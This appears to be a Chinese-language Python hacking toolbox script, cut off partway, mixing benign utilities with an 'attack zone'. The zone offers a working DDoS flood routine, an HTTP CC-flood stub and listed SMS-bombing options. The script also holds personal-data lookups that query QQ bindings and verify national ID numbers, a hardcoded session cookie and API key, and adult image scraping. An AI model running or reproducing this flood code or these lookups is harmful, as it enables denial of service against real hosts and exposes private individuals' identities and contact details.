import os
import sys
import webbrowser
import pathlib
import urllib
import time
import base64
import hashlib
import socket
import select
import threading
import re
import random
import struct
import ssl
import string
import asyncio
import warnings
import signal
import concurrent.futures

try:
    from bs4 import BeautifulSoup
    from ping3 import ping
    from tqdm import tqdm
    from packaging import version
    import requests
    import pyfiglet
    import base92
    import yarl
    import urllib3
except ImportError:
    try:
        print("警告: 必要的运行依赖未安装!正在尝试安装依赖，请不要退出...")
        os.system("pip3 install requests bs4 ping3 tqdm packaging pyfiglet base92 yarl urllib3 -i https://pypi.tuna.tsinghua.edu.cn/simple --trusted-host pypi.tuna.tsinghua.edu.cn")        
        
    except (KeyboardInterrupt, EOFError):print("退出。")
finally:
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        import cryptography.hazmat.primitives.padding as cp
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.serialization import load_pem_private_key, load_pem_public_key
        from cryptography.hazmat.primitives.asymmetric import padding
        from Crypto.Cipher import ChaCha20
        from Crypto.Random import get_random_bytes
    except ImportError:
        dep_choice = input("提示: 依赖项中含有一些可能在移动设备中需要安装很久的模块，它们用于文本处理专区的加密功能。如果你不需要这些功能，你可以选择'no'不安装它们。\n[yes/no]").strip()
        if dep_choice.lower() == "yes":
            os.system("pip3 install cryptography Crypto pycryptodome -i https://pypi.tuna.tsinghua.edu.cn")
            print("安装完成，正在重启脚本...")
            time.sleep(1.5)
            os.system("cls" if os.name == "nt" else "clear")
            os.execv(sys.executable, [sys.executable] + sys.argv)
        else:
            os.system("cls" if os.name == "nt" else "clear")

print(f"{'-'*os.get_terminal_size().columns}\n\n{pyfiglet.figlet_format('YY Tools Free',justify='center',font='larry3d',width=os.get_terminal_size().columns)}\n\n{'-'*os.get_terminal_size().columns}\n\n\033[1m{requests.get('https://v1.hitokoto.cn/?c=f&encode=text').text}\033[0m\n\n{pyfiglet.figlet_format('Notice',font='small')}\n{requests.post('http://yyfree.lilys.top/index.php',data={'action':'notice'}).json()['notice']}\n\n{pyfiglet.figlet_format('Options',font='small')}\n反馈&建议: aketeresornesy@gmail.com\n")

option_list = {
    "查档专区(/q)": [
        "Q绑查询(qb)",
        "QQ头像查询(qt)",
        "Q绑邮箱查询(qqem)",
        "QQ综合查询(qzc)",
        "二要素验证(eys)",
        "二要素验证-V2(eys2)",
        "身份证信息查询(sfz)"
    ],    
    "LSP专区(/lsp)": [
        "随机高质量小姐姐视频(xj)",
        "随机小姐姐图片(sjm)",
        "随机小姐姐头像(sjt)",
        "随机白丝(sjb)",
        "随机黑丝(sjh)"
    ],    
    "网页专区(/wpage)": [
        "爬取网页图片(pp)",
        "网页备案查询(ws)",
        "网页tdk查询(tdk)",
        "ping测试(ping)",
        "爬取网页超链接(pa)",
        "爬取网页图标(ico)",
        "dns记录查询(dns)",
        "whois查询(whois)",
        "端口扫描(port)",
        "网站测速(wsp)"
    ],   
    "其他专区(/other)": [
        "手机号归属地查询(pho)",
        "二维码生成(qr)",
        "随机壁纸(sjb)",
        "天气预报(tq)"
    ],   
    "文本处理专区(/ens)": [
        "AES加密(aes)",
        "RSA加密(rsa)",
        "ChaCha20加密(cc20)",
        "md5加密(md5)",
        "hash加密(hash)",
        "base64编码(b64)",
        "base92编码(b92)",
        "hex编码(hex)",
        "二进制转换(bin)",
        "指定编码转换器-不含base(enc)"
    ],
    "攻击专区(/wb)": [
        "CC攻击(cc)",
        "DDOS攻击(ddos)",
        "SYN洪水(syn)",
        "SSL洪水(ssl)",
        "短信轰炸V1: 极高的成功率，速度稍慢(sms1)",
        "短信轰炸V2: 成功率不稳定，速度很快(sms2)"
    ],
    "检查更新": "/check",
    "退出": "/quit"
}

for key, value in option_list.items():
    print(f"{key}:")
    if isinstance(value, list):
        line = ""
        for item in value:
            sep = "\t" if line else ""
            if line and len(line) + len(sep) + len(item) > 60:
                print(f"\t{line}")
                line = item
            else:
                line += sep + item
        if line:
            print(f"\t{line}")
    else:
        print(f"\t{value}")
    print()

try:
    vf = pathlib.Path("/storage/emulated/0/YYtools/yyfree/version")
    vf.parent.mkdir(parents=True, exist_ok=True)
    vf.write_text("1.0.21", encoding="utf-8")
except OSError:
    print("\\033[31m请开启'管理所有文件'权限以写入必要文件!\033[0m")

def catch_photos(api):
    if api is None:
        pass
    
    print("\n\033[1m正在爬取...\033[0m")
    timestamp = str(int(time.time() * 1000))
    photo_path = pathlib.Path("/storage/emulated/0/YYtools/yyfree/photos")
    photo_path.mkdir(parents=True, exist_ok=True)
    try:
        with requests.get(
            api,
            stream=True,
            timeout=20,
            allow_redirects=True
        ) as r:
            r.raise_for_status()
            file_name = r.headers.get("Content-Disposition", "").split("filename=")[-1].strip('"') or f"{timestamp}.jpg"
                            
            file_name = urllib.parse.unquote(file_name)
            file_path = photo_path / file_name
                            
            with open(file_path, "wb") as pf:
                for chunk in r.iter_content(chunk_size=8192):
                    if chunk:
                        pf.write(chunk)
            print(f"爬取完成，图片已保存至\033[1m{file_path}\033[0m")
            
    except requests.exceptions:
            print("\033[31m客户端错误，连接异常!\033[0m")
    except OSError:
            print("\033[31m文件系统异常，没有权限读写文件!\033[0m")
            
while True:
    try:
        select_mode = str(input("\n\033[1m输入专区代号+空格+子功能代号(必须小写):\033[0m ")).strip()
    except (ValueError, TypeError, KeyboardInterrupt, EOFError):
        print("\033[31m不合法的输入!\033[0m")
        continue

    match select_mode:
        case "/quit":
            break
        case "/check":
            try:
                message = requests.get("https://raw.githubusercontent.com/Resornesy/resornesy-offline-repo/main/parse/yyfree-config.json")
                if message.status_code not in (404, 500):
                    message.encoding = message.apparent_encoding
                    message = message.json()
                    with open("/storage/emulated/0/YYtools/yyfree/version", "r", encoding="utf-8") as vfile:
                        version_log = vfile.read()
                    if version.parse(version_log) < version.parse(message["last-version"]):
                        print(f"发现新版本:\n{message['last-version']}\n{message['description']}\n发布于: {message['date']}")
                        yyfree = message["url"]
                        try:
                            uc = input("是否更新?[yes/no]: ").lower()
                            if uc == "yes":
                                new_path = pathlib.Path("/storage/emulated/0/YYtools/yyfree/downloads")
                                new_path.mkdir(parents=True, exist_ok=True)
                                yyfree_file = new_path / "YY工具箱Free.py"
                                headers = {
                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, Like Gecko) Chrome/119.0 Safari/537.36"
                                }
                                
                                with requests.get(yyfree, stream=True, headers=headers, timeout=20) as res:
                                    res.raise_for_status()
                                    total = int(res.headers.get("Content-Length", 0))
                                    with open(yyfree_file, "wb") as f, tqdm(
                                        desc=f"正在下载...",
                                        total=total,
                                        unit="B",
                                        unit_scale=True,
                                        unit_divisor=1024,
                                        miniters=1
                                    ) as bar:
                                        for chunk in res.iter_content(chunk_size=8192):
                                            if chunk:
                                                f.write(chunk)
                                                bar.update(len(chunk))
                                print(f"更新完成，更新包位置: {yyfree_file}")
                            else:
                                print("退出")
                                
                        except (ValueError, KeyboardInterrupt, EOFError):
                            print("输入格式不对!")
                    else:
                        print("已是最新版本!")
                else:
                    print("解析失败!")
            except requests.exceptions.RequestException:
                 print(f"\033[31m查询失败!请检查网络连接\033[0m")
                 
        case _:
            parts = select_mode.split()
            if len(parts) != 2:
                print("\033[31m输入格式不对!\033[0m")
                continue
            zone_code, option_code = parts

            match (zone_code, option_code):
                case ("/q", "qb"):
                    try:
                        webbrowser.open_new("https://qb.heikebook.com")
                    except Exception:
                        print("\033[31m打开失败!\033[0m")
                case ("/q", "qt"):
                    try:
                        qqh = int(input("输入QQ号: "))
                        size = int(input("头像尺寸(只支持40,100,140,640): "))
                        print(f"\nQQ头像: http://q1.qlogo.cn/g?b=qq&nk={qqh}&s={size}\n")
                    except (ValueError, KeyboardInterrupt, EOFError, TypeError):
                        print("\033[31m请输入正确的格式!不要输入除数字以外的其他字符\033[0m")
                case ("/q", "qqem"):
                    try:
                        qqh = int(input("输入QQ号: "))
                        qq_email = requests.get(f"https://v.api.aa1.cn/api/qqemail/index.php?qq={qqh}")
                        if qq_email.status_code == 200:
                            print(f"\n{qq_email.text}\n")
                        else:
                            print("\033[31m查询失败!请检查网络连接\033[0m")
                    except (ValueError, KeyboardInterrupt, EOFError, TypeError):
                        print("\033[31m请输入正确的格式!不要输入除数字以外的其他字符\033[0m")
                    
                case ("/q", "qzc"):
                    try:
                        qqh = int(input("输入QQ号: "))
                        qq_profile = requests.get(f"https://v.api.aa1.cn/api/qqjson/index.php?qq={qqh}")
                        if qq_profile.status_code == 200:
                            qq_profile = qq_profile.json()
                            keys = {"nickname", "touxiang", "email"}
                            if keys <= qq_profile.keys():
                                print(f"\n昵称: {qq_profile['nickname']}\n头像: {qq_profile['touxiang']}\n邮箱: {qq_profile['email']}")
                            else:
                                for k in keys:
                                    if k in qq_profile:
                                        print(f"{k}: {data[k]}")
                    except (ValueError, KeyboardInterrupt, EOFError, TypeError):
                        print("\033[31m请输入正确的格式!不要输入除数字以外的其他字符\033[0m")
                    
                case ("/q", "eys"):
                    name = input("\n姓名: ")
                    id_num = input("身份证号: ")
                    
                    check_eys = requests.get(f"http://sucyan.cfd/api/2ys2.php?name={name}&id={id_num}")
                    if check_eys.status_code == 200:
                        print(check_eys.text)
                    else:
                        print("\033[31m查询失败!请检查网络连接\033[0m")
                
                case ("/q", "eys2"):
                    print("V2版本为实验功能，仅可验证成年人的户籍。反馈请发送到aketeresornesy@gmail.com")
                    name = input("\n姓名: ")
                    id_num = input("身份证号: ")
                    
                    params = {
                        "gid": "register",
                        "uid": "346967518",
                        "name": name,
                        "idNum": id_num,
                        "ck": "2",
                        "version": "465926",
                        "_": "6375254968375"
                    }
                    
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Linux; Android 13; 23049RAD8C Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.103 Mobile Safari/537.36",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "Accept-Encoding": "gzip, deflate, br, zstd",
                        "sec-ch-ua": "\"Not)A;Brand\";v=\"99\", \"Android WebView\";v=\"127\", \"Chromium\";v=\"127\"",
                        "sec-ch-ua-mobile": "?1",
                        "sec-ch-ua-platform": "\"Android\"",
                        "Upgrade-Insecure-Requests": "1",
                        "dnt": "1",
                        "X-Requested-With": "mark.via",
                        "Sec-Fetch-Site": "none",
                        "Sec-Fetch-Mode": "navigate",
                        "Sec-Fetch-User": "?1",
                        "Sec-Fetch-Dest": "document",
                        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                        "Cookie": "SERVER_ID=f23e65e6418a4d03af6561d6cf390240; PHPSESSID=moj4v870tpjmcq25h5mmub20t4; loginfrom=0100; web_uniques=891188935; preparekk=Mjc4ODU3NDc2MQ%3D%3D; timekey=af368c8719fdf1c06f84c48716ae5844; username=k2788574761; identity=k2788574761; nickname=2788574800; userid=892853978; kk=2788574800; logintime=1724675254; avatar=http%3A%2F%2Fsface.7k7kimg.cn%2Fuicons%2Fphoto_default_s.png; securitycode=f3c28d2d823ed66afdd5717775aeb11c; k7_union=9999999; k7_username=k2788574761; k7_uid=892853978; k7_from=3841; k7_reg=1724675254; k7_ip=10.19.27.189; userprotect=eeda8be88efdeef8b26010266232be2d; userpermission=6a1558b9f756c09affad6f72ea3b0823; k7_lastlogin=2024-08-26+20%3A27%3A34; k7_lastlogin=1724675448"
                    }
                    
                    try:
                        response = requests.post("https://web.7k7k.com/api/fcmauth.php", params=params, headers=headers)
                        if response.status_code == 200:
                            response.encoding = response.apparent_encoding
                            response = response.json()
                            if "成功" in response["info"]:
                                print("验证成功!")
                            else:
                                print("验证失败!")
                        else:
                            print("无法连接上服务器")
                    except requests.exceptions.RequestException:
                        print("网络错误!")
                
                case ("/q", "sfz"):
                    id_num = input("\n身份证号: ")
                    
                    sfz_msg = requests.get(f"https://api.nxvav.cn/api/idcard/?id={id_num}")
                    if sfz_msg.status_code == 200:
                        sfz_msg = sfz_msg.json()
                        
                        if sfz_msg["code"] == 200:
                            print(f"\033[1m{sfz_msg['msg']}\033[0m\n身份证号: {sfz_msg['data']['idCardNum']}\n生日: {sfz_msg['data']['birthday']}\n性别: {sfz_msg['data']['sex']}\n年龄: {sfz_msg['data']['age']}\n住址: {sfz_msg['data']['address']}\n")
                        else:
                            print("\033[1m查询失败!\033[0m")
                            
                case ("/lsp", "xj"):
                    print("\n\033[1m正在爬取...\033[0m")
                    timestamp = str(int(time.time() * 1000))
                    video_path = pathlib.Path("/storage/emulated/0/YYtools/yyfree/videos")
                    video_path.mkdir(parents=True, exist_ok=True)
                    try:
                        with requests.get(
                            "http://api.yujn.cn/api/zzxjj.php?type=video",
                            stream=True,
                            timeout=30,
                            allow_redirects=True
                        ) as r:
                            r.raise_for_status()
                            file_name = r.headers.get("Content-Disposition", "").split("filename=")[-1].strip('"') or f"{timestamp}.mp4"
                            filename = urllib.parse.unquote(file_name)
                            file_path = video_path / file_name
                            with open(file_path, "wb") as vf:
                                for chunk in r.iter_content(chunk_size=8192):
                                    if chunk:
                                        vf.write(chunk)
                        print(f"爬取完成，视频已保存至\033[1m{file_path}\033[0m")
                    except requests.exceptions.RequestException:
                        print("\033[31m客户端错误，连接异常!\033[0m")
                    except OSError:
                        print("\033[31m文件系统异常，没有权限读写文件!\033[0m")
                    
                case ("/lsp", "sjm"):
                    catch_photos("https://v2.api-m.com/api/meinvpic?return=302")         
                case ("/lsp", "sjt"):
                    try:
                        response = requests.get("https://v.api.aa1.cn/api/api-tx/index.php?wpon=json")
                        if response.status_code not in (404, 500):
                            response.encoding = response.apparent_encoding
                            response = response.json()
                            if response["result"] == 200 and response["error"] == 0:
                                catch_photos(f"https:{response['img']}")
                            else:
                                print("服务器响应错误!")
                        else:
                            print("无法连接!")
                    except requests.exceptions.RequestException:
                        print(f"\033[31m查询失败!请检查网络连接\033[0m")
                            
                case ("/lsp", "sjb"):
                    catch_photos("https://v2.api-m.com/api/baisi?return=302")
                
                case ("/lsp", "sjh"):
                    catch_photos("https://v2.api-m.com/api/heisi?return=302")
                
                case ("/wpage", "pp"):
                    url = input("输入网站域名(请加http|https前缀): ")
                    
                    try:
                        response = requests.get(url, timeout=20)
                        response.encoding = response.apparent_encoding
                        wpage_soup = BeautifulSoup(response.text, "html.parser")
                        img_tags = wpage_soup.find_all("img")
                        img_list = []
                        for tag in img_tags:
                            src = tag.get("src")
                            if src:
                                img_url = urllib.parse.urljoin(url, src)
                                img_list.append(img_url)
                        if img_list:
                            for img_url in img_list:
                                print(f"\n正在爬取: {img_url}")
                                catch_photos(img_url)
                        else:
                            print("\033[33m未找到可爬取的图片!\033[0m")
                            
                    except requests.exceptions.RequestException:
                        print(f"\033[31m查询失败!请检查网络连接\033[0m")
                    
                case ("/wpage", "ping"):
                    host = input("\n输入主机ip或域名，按Ctrl+C或D退出ping: ")
                    
                    total = 30
                    success = 0
                    try:
                        for i in range(1, total + 1):
                            print(f"ping {host} 第{i}次...", end=" ")
                            try:
                                delay = ping(host, timeout=5)
                                if delay is not None:
                                    success += 1
                                    print(f"{host}连接成功，延迟: {delay*1000:.2f}ms")
                                else:
                                    print(f"{host}无响应")
                            except ping3.HostUnknownException:
                                print(f"未知主机: {host}")
                            except exceptions.TimeoutException:
                                print(f"连接超时: {host}")
                    except (KeyboardInterrupt, EOFError):
                        print("\n\033[1m已退出\033[0m")
                    finally:
                        print(f"\n总次数: {total}\t成功次数: {success}\t失败次数: {total-success}")
                
                case ("/wpage", "pa"):
                    url = input("请输入网站域名(请加http|https前缀):")
                    
                    try:
                        response = requests.get(url, timeout=20)
                        response.encoding = response.apparent_encoding
                        wpage_soup = BeautifulSoup(response.text, "html.parser")
                        link_tags = wpage_soup.find_all("a")
                        link_list = []
                        for a in link_tags:
                            href = a.get("href")
                            if href:
                                link_list.append(href)
                        if link_list:
                            print(a)
                        else:
                            print("没有找到超链接!")
                    except requests.exceptions.RequestException:
                         print(f"\033[31m查询失败!请检查网络连接\033[0m")
                
                case ("/wpage", "ico"):
                    url = input("请输入网站域名(请加http|https前缀): ")
                    
                    try:
                        response = requests.get(url, timeout=20)
                        response.encoding = response.apparent_encoding
                        response.raise_for_status()
                        
                        wpage_soup = BeautifulSoup(response.text, "html.parser")
                        icon_tag = wpage_soup.find_all(
                            "link",
                            rel=lambda x: x and any(key in str(x).lower() for key in ["icon", "apple-touch-icon"])
                        )
                        
                        if not icon_tag:
                            icon_tag = [{"href": "/favicon.ico"}]
                        
                        icon_list = []
                        for ico in icon_tag:
                            icon_href = ico.get("href")
                            if icon_href:
                                icon_url = urllib.parse.urljoin(url, icon_href)
                                if icon_url not in icon_list:
                                    icon_list.append(icon_url)
                        
                        if icon_list:
                            for icon_url in icon_list:
                                print(f"\n找到图标: {icon_url}")
                                catch_photos(icon_url)
                        else:
                            print("未找到图标!")
                    except requests.exceptions.RequestException:
                     print(f"\033[31m查询失败!请检查网络连接\033[0m")
                        
                case ("/wpage", "dns"):
                    url = input("输入网站域名: ")
                    
                    try:
                        dns_record = requests.get(f"https://www.whoisxmlapi.com/whoisserver/DNSService?apiKey=at_CaAcw6UijRlVSsnoUz2KUi0hBHv6C&domainName={url}&type=_all&outputFormat=JSON", timeout=25)
                        dns_record.encoding = dns_record.apparent_encoding
                        
                        if dns_record.status_code == 200:
                            dns_record = dns_record.json()
                            for rec in dns_record.get("DNSData", {}).get("dnsRecords", []):
                                print(f"类型: {rec.get('dnsType', '')}\n名称: {rec.get('name', '')}\nTTL: {rec.get('ttl', '')}\n原始文本: {rec.get('rawText', '')}")
                                if rec.get("type") == 1:
                                    print(f"IPV4: {rec.get('address', '')}")
                                elif rec.get("type") == 6:
                                    print(f"主DNS服务器: {rec.get('host', '')}\n管理员邮箱: {rec.get('admin', '')}\n序列号: {rec.get('serial', '')}")
                                elif rec.get("type") == 16:
                                    for txt in rec.get("strings", []):
                                        print(f"TXT: {txt}")
                                    print()
                                else:
                                    print("未知类型!")
                        else:
                            print("未查询到DNS记录!")
                    except requests.exceptions.RequestException:
                         print(f"\033[31m查询失败!请检查网络连接\033[0m")
                         
                case ("/wpage", "whois"):
                        url = input("输入网站域名: ")
                        
                        try:
                            whois = requests.get(f"https://v2.api-m.com/api/whois?domain={url}")
                            whois.encoding = whois.apparent_encoding
                            whois_map = {
                                "Domain Name": "域名",
                                "Registeration Time": "注册时间",
                                "Expiration Time": "到期时间",
                                "DNS_SERVE": "DNS服务器",
                                "dns_serve": "DNS服务器",
                                "Registrar URL": "注册商网址",
                                "registrar_url": "注册商网址",
                                "domain_status": "域名状态",
                                "Domain Status": "域名状态",
                                "Registrant": "注册人",
                                "Registrant Contact Email": "注册人邮箱",
                                "registrant_ontact_email": "注册人邮箱",
                                "Sponsoring Registrar": "赞助注册商",
                                "sponsoring registrar": "赞助注册商"
                            }
                            
                            if whois.status_code == 200:
                                whois = whois.json()
                                if whois.get("code") == 200:
                                    data = whois.get("data", {})
                                    for en,zh in whois_map.items():
                                        value = data.get(en) or data.get(en.lower())
                                        if value:
                                            print(f"{zh}: {value}")
                                    print()
                                else:
                                    print("查询失败")
                            else:
                                print("网络错误!无法连接服务器")
                        except requests.exceptions.RequestException:
                             print(f"\033[31m查询失败!请检查网络连接\033[0m")
                
                case ("/wpage", "port"):                    
                    try:
                        url = input("输入网站域名或ipv4地址: ")
                        print("正在扫描，可能需要一段时间...")
                        port_status = requests.get(f"https://v.api.aa1.cn/api/api-port/go.php?ip={url}", timeout=35)
                        port_status.encoding = port_status.apparent_encoding
                        if port_status.status_code == 200:
                            print(port_status.text)
                        else:
                            print("连接失败!")
                    except (EOFError, KeyboardInterrupt, requests.exceptions.RequestException):
                        print("扫描失败!请检查网络连接，扫描的时候不要乱动键盘!")
                    
                case ("/wpage", "wsp"):
                    url = input("输入网站域名: ")
                    
                    try:
                        headers = {
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, Like Gecko) Chrome/118.0.0.0 Safari/537.36",
                            "Accept": "application/json, text/plain, */*",
                            "Connection": "keep-alive"
                        }
                        
                        response = requests.get(f"https://v.api.aa1.cn/api/speed-web/?url={url}", headers=headers)
                        
                        if response.status_code not in (404, 500):
                            response.encoding = response.apparent_encoding
                            response = response.json()
                            if response["code"] == 1:
                                print(f"\n{response['msg']}\n域名: {response['url']}\n延迟最快: {response['su_kuai']}\n延迟最慢: {response['su_man']}\n平均延迟: {response['su_pj']}")
                            elif response["code"] == -1:
                                print(response["msg"])
                            else:
                                print("未知状态!")
                        else:
                            print("服务器响应失败!")
                    except requests.exceptions.RequestException:
                         print(f"\033[31m查询失败!请检查网络连接\033[0m")
                
                case ("/other", "pho"):
                    phone_num = input("输入手机号: ")
                    
                    try:
                        requests.packages.urllib3.disable_warnings()
                        headers = {
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, Like Gecko) Chrome/118.0.0.0 Safari/537.36",
                            "Accept": "application/json, text/plain, */*",
                            "Connection": "keep-alive"
                        }
                        
                        phone_address = requests.get(f"https://api.songzixian.com/api/phone-location?dataSource=PHONE_NUMBER_LOCATION&phoneNumber={phone_num}", headers=headers, verify=False)
                        if phone_address.status_code == 200:
                            phone_address.encoding = phone_address.apparent_encoding
                            phone_address = phone_address.json()
                            if phone_address["code"] == 200:
                                data = phone_address["data"]
                                print(f"\n手机号: {data['phoneNumber']}\n手机号前缀: {data['numberPrefix']}\n省区: {data['province']}\n城市: {data['city']}\n运营商: {data['carrier']}\n地区代码: {data['areaCode']}\n邮政编码: {data['postalCode']}\n行政区划代码: {data['adminDivisionCode']}")
                            elif phone_address["code"] == 500:
                                print("没有匹配到手机号!")
                            else:
                                print("未知状态码!")
                        else:
                            print("无法连接到服务器!")
                    except requests.exceptions.RequestException:
                         print(f"\033[31m查询失败!请检查网络连接\033[0m")
                    
                case ("/other", "qr"):
                    text = input("请输入二维码文字: ")
                    size = input("请输入二维码尺寸: ")
                    catch_photos(f"http://api.lykep.com/api/qrcode?frame=1&e=L&text={text}&size={size}")
                    
                case ("/other", "sjb"):
                    catch_photos("https://v2.api-m.com/api/wallpaper?return=302")
               
                case ("/other", "tq"):
                    city = input("输入你的城市名: ")
                   
                    try:
                       weather = requests.get(f"https://v.api.aa1.cn/api/api-tianqi-3/index.php?msg={city}&type=1")
                       
                       weather.encoding = weather.apparent_encoding
                       weather = weather.json()
                       if weather["code"] == "1":
                           forecasts = weather["data"]
                           for f in forecasts:
                               print(f"{f['riqi']}: {f['tianqi']}, 气温{f['wendu']}摄氏度, {f['fengdu']}, 空气质量{f['pm']}")
                       elif weather["code"] == "0":
                           print("查询失败!")
                       else:
                           print("未知状态码!")
                    except json.JSONDecodeError:
                        print("返回格式错误")
                    except requests.exceptions.RequestException:
                        print(f"\033[31m查询失败!请检查网络连接\033[0m")
               
                case ("/ens", "aes"):
                    print("\nAES版本: AES-256-CBC PKCS7 encoding=utf-8")
                    key = input("输入32字节密钥(如不填则随机生成): ").strip() or os.urandom(32)
                    iv = input("输入16字节初始向量(如不填随机生成): ").strip() or os.urandom(16)
                    text = input("要加密的文本: ")
                    if len(key) != 32 or len(iv) != 16:print("AES-256要求密钥32字节，初始向量16字节!")
                   
                    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
                    encryptor = cipher.encryptor()
                    padder = cp.PKCS7(128).padder()
                    padder_data = padder.update(text.encode("utf-8")) + padder.finalize()
                    encrypted = encryptor.update(padder_data) + encryptor.finalize()
                   
                    print(f"加密完成\n密钥: {base64.b64encode(key).decode()}\n初始向量(IV): {base64.b64encode(iv).decode()}\n原文: {text}\n密文: {base64.b64encode(encrypted).decode()}")
                
                case ("/ens", "rsa"):
                    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
                    public_key = private_key.public_key()
                    
                    private_pem = private_key.private_bytes(
                        encoding=serialization.Encoding.PEM,
                        format=serialization.PrivateFormat.PKCS8,
                        encryption_algorithm=serialization.NoEncryption()
                    ).decode()
                    public_pem = public_key.public_bytes(
                        encoding=serialization.Encoding.PEM,
                        format=serialization.PublicFormat.SubjectPublicKeyInfo
                    ).decode()
                    
                    text = input("要加密的文本: ").encode("utf-8")
                    cipher = public_key.encrypt(
                        text,
                        padding.OAEP(
                            mgf=padding.MGF1(algorithm=hashes.SHA256()),
                            algorithm=hashes.SHA256(),
                            label=None
                        )
                    )
                    
                    plain = private_key.decrypt(
                        cipher,
                        padding.OAEP(
                            mgf=padding.MGF1(algorithm=hashes.SHA256()),
                            algorithm=hashes.SHA256(),
                            label=None
                        )
                    )
                    
                    print(f"加密完成\n公钥: {public_pem}\n私钥: {private_pem}\n原文: {text}\n密文: {base64.b64encode(cipher).decode()}\n解密: {plain.decode('utf-8')}")
                    
                case ("/ens", "cc20"):
                    def cc_encrypt(text, key):
                        nonce = get_random_bytes(12)
                        cipher = ChaCha20.new(key=key, nonce=nonce)
                        return nonce, cipher.encrypt(text)
                    
                    text = input("要加密的文本: ")
                    key = get_random_bytes(32)
                    nonce, ct = cc_encrypt(text.encode(), key)
                    
                    print(f"加密完成\n原文: {text}\n密钥: {base64.b64encode(key).decode()}\nnonce: {base64.b64encode(nonce).decode()}\n密文: {base64.b64encode(ct).decode()}")
                
                case ("/ens", "md5"):
                    text = input("要加密的文本: ")
                    
                    md5 = hashlib.md5(text.encode("utf-8"))
                    print(f"加密成功!\n16位: {md5.hexdigest()[8:-8]}\n32位小写: {md5.hexdigest()}\n32位大写: {md5.hexdigest().upper()}")
                
                case ("/ens", "hash"):
                    while True:
                        text = input("要加密的文本(输入@exit退出): ")
                        if text.strip() == "@exit":break
                        algorithms = {
                            "1": ("SHA-1", hashlib.sha1),
                            "2": ("SHA-224", hashlib.sha224),
                            "3": ("SHA-256", hashlib.sha256),
                            "4": ("SHA-384", hashlib.sha384),
                            "5": ("SHA-512", hashlib.sha512),
                            "6": ("SHA3-256", hashlib.sha3_256),
                            "7": ("SHA3-512", hashlib.sha3_512),
                            "8": ("BLake2b", hashlib.blake2b),
                            "9": ("Blake2s", hashlib.blake2s)
                        }
                        
                        print("\n支持的算法:")
                        for num, (name, _) in algorithms.items():
                            print(f"{num}. {name}")
                        algo = input("输入算法数字编号(默认1): ").strip() or "1"
                        if algo not in algorithms:
                            print("不存在的编号!")
                            continue
                        algo_name, algo_func = algorithms[algo]
                        hash = algo_func(text.encode("utf-8"))
                        
                        print(f"加密结果: {hash.hexdigest()}")
                
                case ("/ens", "b64"):
                    text = input("输入要编码的文本: ")
                    print(base64.b64encode(text.encode()).decode())
                
                case ("/ens", "b92"):
                    text = input("输入要编码的文本: ")
                    print(base92.encode(text.encode()).decode())
                        
                case ("/ens", "hex"):
                    text = input("输入要编码的文本: ")
                    print(' '.join(f'{b:02x}' for b in text.encode()))
                
                case ("/ens", "bin"):
                    text = input("输入要编码的文本: ")
                    print(''.join(f"{ord(c):08b}" for c in text))
                
                case ("/ens", "enc"):
                    text = input("输入要编码的文本: ")
                    enc_from = input("输入被编码文本的原始编码: ")
                    enc_to = input("输入要转换的编码: ")
                    try:
                        print(text.encode(enc_from).decode(enc_to))
                    except Exception as e:
                        print(f"转换失败: {e}")
                
                case ("/wb", "ddos"):
                    try:
                        host = input("目标域名/IPV4: ").strip().removeprefix("https://").removeprefix("http://")
                        port = int(input("目标端口: "))
                        seconds = int(input("攻击持续秒数: "))
                        size_MB = int(input("数据包大小(MB,默认1): ") or 1)
                        CHUNK = b'\x00' * (64 * 1024)
                        total_B = 0

                        class timer:
                            def __enter__(self):
                                self._t0 = time.perf_counter()
                                return self
                            def __exit__(self, *_):
                                self.cost = time.perf_counter() - self._t0

                        def byte_to(byte):
                            for u in ["B","KB","MB","GB"]:
                                if byte < 1024: return f"{byte:.2f}{u}"
                                byte /= 1024
                            return f"{byte:.2f}TB"

                        with timer() as tm:
                            t0 = time.perf_counter()
                            nxt  = t0 + 0.2
                            with socket.create_connection((host, port), timeout=5) as s:
                                s.setblocking(False)
                                while True:
                                    elapsed = time.perf_counter() - t0
                                    if elapsed >= seconds: break

                                    try:
                                        s.send(CHUNK)
                                        total_B += len(CHUNK)
                                    except BlockingIOError:
                                        pass

                                    if time.perf_counter() >= nxt:
                                        print(f"\r已发送 {byte_to(total_B)}\t|\t速率 {byte_to(total_B/elapsed)}/s\t|\t累计 {elapsed:.1f}s", end="", flush=True)
                                        nxt += 0.2

                        print(f"\n结束")
                        print(f"总流量 {byte_to(total_B)}  |  平均 {byte_to(total_B/tm.cost)}/s")

                    except ValueError:
                        print("输入格式不对！")
                    except TimeoutError:
                        print("目标端口连接超时，可能不存在")
                    except ConnectionResetError:
                        print("目标端口未监听")
                    except socket.gaierror:
                        print("目标不存在")
                    except (KeyboardInterrupt, EOFError):
                        print("\n攻击中断")                            
                
                case ("/wb", "cc"):
                    def byte_to(byte):
                        for u in ["B","KB","MB","GB"]:
                            if byte < 1024: return f"{byte:.2f}{u}"
                            byte /= 1024
                        return f"{byte:.2f}TB"
                    
                    host = input("目标域名/IPV4: ").strip()
                    port = int(input("目标端口: "))
                    seconds = float(input("攻击持续秒数: "))
                    if host.startswith("http://") or host.startswith("https://"):
                        host, _, path = re.sub(r"^https?://", "", host).partition("/")
                        path = "/" + path if path else "/"
                    else:
                        host, path = host, "/"
                    
                    req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: py-press/1.0\r\nConnection: close\r\n\r\n".encode()
                    
                    def main():
                        total_bytes = total_req = 0
                        alive = True
                    
                        def worker():
